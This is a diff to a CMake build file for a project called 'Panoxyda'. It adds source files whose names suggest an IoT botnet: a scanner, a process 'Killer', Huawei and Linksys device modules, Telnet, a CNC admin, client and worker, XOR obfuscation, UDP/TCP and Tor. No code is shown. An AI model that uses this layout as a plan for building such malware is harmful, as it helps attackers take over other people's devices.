@@ -49,4 +49,37 @@ add_executable(Panoxyda main.c
         Engine/Analys/Scanner.c
         Engine/Data/Table.c
         Engine/Net/Linksys.c
-        Engine/Net/Protocol.c)
+        Engine/Net/Protocol.c
+        Engine/Analys/Killer.c
+        Engine/Headers/Analys/Killer.h
+        Engine/Headers/Helper.h
+        Engine/Headers/IoT/Huawei.h
+        Engine/IoT/Huawei.c
+        Engine/Headers/Net/TCP.h
+        Engine/Net/TCP.c
+        Engine/Net/UDP.c
+        Engine/Headers/Net/UDP.h
+        Config/Config.c
+        Engine/Headers/Config/Config.h
+        Engine/Net/Telnet.c
+        Engine/Headers/Net/Telnet.h
+        Engine/Headers/Server.h
+        Engine/Server.c
+        Engine/Headers/Net/Connection.h
+        Engine/Net/Connection.c
+        Engine/Binary.c
+        Engine/Headers/Binary.h
+        Engine/CNC/Client.c
+        Engine/CNC/Command.c
+        Engine/CNC/Worker.c
+        Engine/CNC/Admin.c
+        Engine/Headers/CNC/Admin.h
+        Engine/Headers/CNC/Client.h
+        Engine/Headers/CNC/Command.h
+        Engine/Headers/CNC/Worker.h
+        Engine/Headers/CNC/Xor.h
+        Engine/CNC/Xor.c
+        Engine/CNC/Syscalls.c
+        Engine/Headers/CNC/Syscalls.h
+        Engine/Headers/Net/Tor.h
+        Engine/Net/Tor.c)
